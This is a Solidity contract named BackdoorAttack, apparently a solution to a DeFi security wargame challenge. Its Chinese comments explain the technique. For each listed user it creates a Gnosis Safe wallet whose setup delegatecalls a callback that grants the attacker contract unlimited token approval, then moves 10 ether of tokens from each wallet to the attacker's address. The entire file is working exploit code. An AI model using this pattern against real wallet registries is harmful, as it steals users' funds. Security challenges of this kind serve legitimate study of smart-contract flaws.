// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
            address _singleton,
            bytes memory initializer,
            uint256 saltNonce,
            address callback
        ) external returns (address proxy);
}

interface IWalletRegistry {
    function token() external view returns (address);
    function masterCopy() external view returns (address);
}

contract BackdoorAttack {
    function run(address _attackAddress, address _proxyFactory, address _walletRegistryAddress, address [] calldata users) external {
        address[] memory _owners = new address[](1);
        for (uint i=0;i<users.length;i++) {
            _owners[0]=users[i];
            //GnosisSafe创建的时候可以指定代理执行某个外部合约（delegatecall）。详细查看GnosisSafe.createProxyWithCallback
            //在delegatecall就可以执行approve
            bytes memory data = abi.encodeWithSelector(bytes4(keccak256("proxyCallback(address,address)")),_walletRegistryAddress,address(this));
            address proxy = IGnosisSafeProxyFactory(_proxyFactory).createProxyWithCallback(
                IWalletRegistry(_walletRegistryAddress).masterCopy(),            
                abi.encodeWithSelector(
                    bytes4(keccak256("setup(address[],uint256,address,bytes,address,address,uint256,address)")),
                    _owners,
                    1,
                    address(this),
                    data,
                    address(0),
                    address(0),
                    0,
                    address(0)
                    ),
                1,
                _walletRegistryAddress
            );
            IERC20(IWalletRegistry(_walletRegistryAddress).token()).transferFrom(proxy, _attackAddress, 10 ether);
        }
    }
    function proxyCallback(address _walletRegistryAddress , address _attackerContractAddress) external {
        IERC20(IWalletRegistry(_walletRegistryAddress).token()).approve(_attackerContractAddress,type(uint256).max);
    }
}
 